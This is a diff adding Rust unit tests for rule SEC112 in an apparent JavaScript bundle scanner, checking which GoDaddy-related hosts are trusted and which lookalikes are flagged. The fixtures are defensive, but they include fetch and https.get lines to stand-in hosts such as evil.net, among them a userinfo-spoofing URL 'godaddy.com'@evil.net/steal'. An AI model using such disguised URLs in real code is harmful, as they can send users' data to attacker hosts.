@@ -300,6 +300,93 @@ fn sec112_godaddy_lookalike_blocked() {
     );
 }
 
+#[test]
+fn sec112_nonprod_godaddy_domains_allowed() {
+    for url in [
+        "https://dev-godaddy.com/v1",
+        "https://api.dev-godaddy.com/v1",
+        "https://test-godaddy.com/v1",
+        "https://api.test-godaddy.com:8443/v1",
+        "https://ote-godaddy.com/v1",
+        "https://api.ote-godaddy.com/v1?x=1",
+    ] {
+        let findings = scan_bundle(&format!(r#"fetch("{url}");"#), "test.mjs");
+        assert!(
+            findings.iter().all(|f| f.rule_id != "SEC112"),
+            "{url} should be trusted: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn sec112_bare_host_urls_allowed() {
+    for code in [
+        r#"fetch("https://dev-godaddy.com");"#,
+        r#"fetch('https://test-godaddy.com');"#,
+        "fetch(`https://ote-godaddy.com`);",
+        r#"fetch("https://godaddy.com");"#,
+        r#"fetch("https://api.godaddy.com");"#,
+        r#"fetch("http://localhost");"#,
+        r#"fetch("http://127.0.0.1");"#,
+    ] {
+        let findings = scan_bundle(code, "test.mjs");
+        assert!(
+            findings.iter().all(|f| f.rule_id != "SEC112"),
+            "{code} should be trusted: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn sec112_bare_host_lookalikes_blocked() {
+    for code in [
+        r#"fetch("https://evil.net");"#,
+        r#"fetch("https://evil-dev-godaddy.com");"#,
+        r#"fetch('https://dev-godaddy.com.evil.net');"#,
+        "fetch(`https://stage-godaddy.com`);",
+    ] {
+        let findings = scan_bundle(code, "test.mjs");
+        assert!(
+            findings.iter().any(|f| f.rule_id == "SEC112"),
+            "{code} should not be trusted: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn sec112_nonprod_godaddy_lookalikes_blocked() {
+    for url in [
+        "https://evil-dev-godaddy.com/",
+        "https://dev-godaddy.com.evil.net/",
+        "https://stage-godaddy.com/",
+        "https://devgodaddy.com/",
+        "https://dev-godaddy.co/",
+        "https://evil.net/dev-godaddy.com",
+    ] {
+        let findings = scan_bundle(&format!(r#"fetch("{url}");"#), "test.mjs");
+        assert!(
+            findings.iter().any(|f| f.rule_id == "SEC112"),
+            "{url} should not be trusted: {findings:?}"
+        );
+    }
+}
+
+#[test]
+fn sec112_mixed_quote_userinfo_blocked() {
+    for code in [
+        r#"https.get("https://godaddy.com'@evil.net/steal");"#,
+        r#"https.get('https://godaddy.com"@evil.net/steal');"#,
+        "https.get(`https://godaddy.com'@evil.net/steal`);",
+        r#"https.get("https://dev-godaddy.com`@evil.net/steal");"#,
+    ] {
+        let findings = scan_bundle(code, "test.mjs");
+        assert!(
+            findings.iter().any(|f| f.rule_id == "SEC112"),
+            "{code} should not be trusted: {findings:?}"
+        );
+    }
+}
+
 // -----------------------------------------------------------------------
 // SEC113 — any encoded payload (no signal, warn)
 // -----------------------------------------------------------------------
